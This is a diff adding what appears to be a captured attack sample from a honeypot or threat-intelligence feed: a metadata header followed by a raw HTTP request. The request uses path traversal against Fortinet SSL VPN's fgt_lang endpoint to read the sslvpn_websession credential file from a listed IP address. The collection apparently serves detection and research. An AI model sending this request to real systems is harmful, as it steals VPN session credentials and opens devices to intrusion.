@@ -1,0 +1,16 @@
+# sha256: 2019e70b1cc3d8c003ac111166fbb64301cb1b23d1e397db8fa5f7bce11bb0d8
+# family: script_generic
+# kind: script
+# size_bytes: 219
+# first_seen: 2026-09-01 22:33:08.707557 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1
+Host: 190.179.130.96:2563
+User-Agent: python-requests/2.27.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
